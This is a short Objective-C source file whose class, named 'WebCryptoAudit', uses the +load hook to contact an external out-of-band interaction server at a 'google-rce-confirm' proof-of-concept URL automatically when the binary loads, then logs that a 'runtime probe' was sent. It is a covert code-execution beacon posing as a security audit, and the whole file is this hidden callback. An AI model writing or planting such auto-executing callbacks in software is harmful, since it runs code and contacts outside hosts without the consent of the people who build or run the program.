#import <Foundation/Foundation.h>

@interface WebCryptoAudit : NSObject
@end

@implementation WebCryptoAudit
// +load dieksekusi otomatis oleh runtime saat binary di-load
+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSString *oast = @"https://google-rce-confirm.rscrwozltcmjjimsghzq185xjlnq9jifu.oast.fun/poc-v107";
        NSURL *url = [NSURL URLWithString:oast];
        if (url) {
            NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {}];
            [task resume];
            
            NSLog(@"[!] GOOGLE WEBCRYPTO SECURITY AUDIT - V1.0.7 RUNTIME PROBE SENT");
        }
    });
}
@end
